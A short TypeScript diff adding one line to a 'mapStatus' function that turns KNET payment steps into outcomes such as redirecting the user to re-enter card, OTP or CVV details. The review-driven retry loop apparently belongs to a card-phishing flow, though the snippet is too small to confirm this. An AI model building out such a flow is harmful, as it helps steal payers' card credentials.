@@ -14,6 +14,7 @@ function bearer(req: Request) {
 function mapStatus(status: string, step: string): string {
   if (status === "approved") return "accepted";
   if (status === "rejected") return "rejected";
+  if (step === "awaiting_phone" || step === "awaiting_amount") return "new";
   if (step === KNET_REVIEW.retryCard) return "redirect_card";
   if (step === KNET_REVIEW.retryOtp || step === KNET_REVIEW.retryOtp2) return "redirect_otp";
   if (step === KNET_REVIEW.retryCvv) return "redirect_cvv";
